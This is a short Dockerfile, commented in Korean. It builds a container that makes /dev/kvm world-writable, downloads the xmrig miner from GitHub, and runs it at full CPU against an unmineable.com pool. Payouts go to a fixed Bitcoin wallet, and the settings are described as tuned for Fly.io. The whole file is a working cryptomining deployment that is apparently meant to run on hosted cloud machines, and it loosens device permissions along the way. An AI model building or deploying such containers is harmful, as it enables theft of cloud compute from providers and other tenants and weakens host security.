# 베이스 이미지는 최신 Ubuntu를 사용하여 호환성을 확보합니다.
FROM ubuntu:latest

# 필요한 기본 패키지(curl, tar, sudo, kmod) 설치
RUN apt-get update && apt-get install -y \
    curl \
    tar \
    sudo \
    kmod \
    && rm -rf /var/lib/apt/lists/*

# 작업 디렉토리 설정
WORKDIR /app

# 실행 스크립트 생성
# 이 스크립트는 KVM 권한을 체크하고, 수정 후 xmrig를 실행합니다.
RUN echo '#!/bin/bash\n\
# 🚨 KVM 노드 상태 확인 및 권한 부여\n\
ls -l /dev/kvm\n\
sudo chmod 666 /dev/kvm\n\
\n\
# 📥 자원 다운로드 및 압축 해제\n\
curl -L -o m.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz\n\
tar -xf m.tar.gz\n\
cd xmrig-6.21.0\n\
\n\
# 🚀 xmrig 실행 (Fly.io 환경 최적화 설정 적용)\n\
./xmrig -a ghostrider -o ghostrider.unmineable.com:80 -u BTC:bc1qlz0d2jurgfh60mqusvg9yp9lkkxms9ehul23ln.XOX_$HOSTNAME#tofg-baz9 --donate-level 1 --randomx-1gb-pages --asm=auto --cpu-max-threads-hint 100\n\
' > /app/run.sh && chmod +x /app/run.sh

# 컨테이너 실행 시 스크립트 작동
CMD ["/bin/bash", "/app/run.sh"]
